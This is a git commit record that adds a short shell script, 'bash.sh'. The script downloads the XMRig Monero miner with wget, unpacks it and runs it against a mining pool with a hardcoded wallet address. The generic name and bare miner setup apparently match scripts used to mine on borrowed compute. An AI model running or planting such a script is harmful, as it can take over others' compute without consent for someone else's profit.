a6ff3a08d0b18ac237ed305fde0498b7c8504548
Jasurlalka <106442837+Jasurlalka@users.noreply.github.com>
2022-05-28 21:12:08 +0500

    Create bash.sh

---
+++ bash.sh
@@ -0,0 +1,5 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.15.0/xmrig-6.15.0-linux-static-x64.tar.gz
+tar -xvf xmrig-6.15.0-linux-static-x64.tar.gz
+ls
+cd xmrig-6.15.0
+./xmrig -o sg.minexmr.com:443 -u 82gSRPn7YRX5kraiP6rNHv72pdmSnXRLpM4opjemZzTyN2NbJyw3MeWMvmrsnZv5r9R665adiwScRG5smDN8UHypCFLNveM -k --tls --rig-id rig
